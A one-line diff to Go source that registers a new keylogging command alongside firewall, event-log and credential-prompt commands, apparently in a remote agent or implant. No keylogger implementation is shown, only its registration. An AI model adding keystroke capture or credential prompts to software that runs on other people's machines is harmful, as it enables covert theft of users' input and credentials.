@@ -38,4 +38,5 @@ func registerPlatformCommands() {
 	RegisterCommand(&FirewallCommand{})
 	RegisterCommand(&EventLogCommand{})
 	RegisterCommand(&CredentialPromptCommand{})
+	RegisterCommand(&KeylogCommand{})
 }
